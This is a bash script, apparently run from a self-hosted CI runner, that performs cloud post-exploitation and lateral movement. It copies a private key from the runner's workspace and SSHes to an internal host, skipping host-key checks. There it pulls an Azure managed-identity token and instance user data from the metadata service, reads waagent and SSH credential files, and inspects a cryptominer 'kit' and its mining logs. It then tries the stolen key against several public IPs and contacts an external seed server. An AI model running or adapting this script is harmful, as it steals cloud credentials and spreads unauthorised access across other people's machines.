set +e
TS=$(date -u +%s)
O=/tmp/pivot4-9927.txt; : > $O; exec >> $O 2>&1
R=/opt/ul-runner/_work/ul-plant/ul-plant
echo "==M4-START ts=$TS"
sudo -n cp $R/az/ibm_key.pem /tmp/ibm2.pem 2>/dev/null; sudo -n chmod 644 /tmp/ibm2.pem 2>/dev/null; cp $R/az/ibm_key.pem /tmp/ibm2.pem 2>/dev/null; chmod 644 /tmp/ibm2.pem 2>/dev/null
S24="ssh -n -i /tmp/ibm2.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24"
echo "==A1 IMDS compute"
timeout 25 $S24 "curl -s -m 12 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json'; echo RC=\$?" 2>&1
echo "==A2 IMDS userdata"
timeout 25 $S24 "curl -s -m 12 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text'; echo RC=\$?" 2>&1
echo "==A3 IMDS token mgmt"
timeout 30 $S24 "curl -s -m 12 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'; echo RC=\$?" 2>&1
echo "==A4 wire"
timeout 20 $S24 "curl -s -m 8 -H 'x-ms-version: 2012-11-30' 'http://168.63.129.16/machine/?comp=goalstate'; echo RC=\$?" 2>&1
echo "==A5 userdata-file"
timeout 30 $S24 "sudo -n head -c 4000 /var/lib/cloud/instance/user-data.txt" 2>&1
echo "==A6 waagent"
timeout 30 $S24 "sudo -n ls -la /var/lib/waagent 2>&1 | head -15; echo ---; sudo -n bash -c 'for f in /var/lib/waagent/*.xml; do echo ==F \$f; head -c 1200 \$f; echo; done' 2>&1 | head -60" 2>&1
echo "==A7 identity-files"
timeout 30 $S24 "ls -la ~/.ssh 2>&1; echo ---; cat ~/.ssh/authorized_keys 2>/dev/null | wc -l; echo ---; ls -la ~/.azure /etc/azure /var/lib/azure 2>&1 | head -15; echo ---; which az; sudo -n ls /etc/systemd/system/ 2>/dev/null | grep -i t19 | head" 2>&1
echo "==A8 share-proof"
timeout 30 $S24 "sudo -n grep -ahoE 'accepted \\([0-9]+/[0-9]+\\)|difficulty [0-9]+|[0-9.]+ TH/s' /opt/t19/logs/*.log 2>/dev/null | tail -8; pgrep -af peakminer | head -4" 2>&1
echo "==B pubssh-from-24"
timeout 90 $S24 'for ip in 20.109.152.114 20.109.162.87 20.224.49.203 4.223.115.30 20.90.174.76; do echo "-- $ip"; timeout 10 ssh -n -i ~/.ssh/id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 ubuntu@$ip "id" 2>&1 | tail -2; done' 2>&1
echo "==A9 kit"
timeout 40 $S24 "sudo -n ls -la /opt/t19 2>&1 | head -20; echo ---; sudo -n head -c 2500 /opt/t19/keep.sh 2>/dev/null; echo ---; sudo -n head -c 1200 /opt/t19/run-g.sh 2>/dev/null" 2>&1
echo "==A10 seed"
timeout 30 $S24 "curl -s -m 8 http://163.68.86.6:8090/ 2>&1 | head -c 500; echo; curl -s -m 8 http://163.68.86.6:8090/api/stats 2>&1 | head -c 300" 2>&1
echo "==M4-END"
exit 0
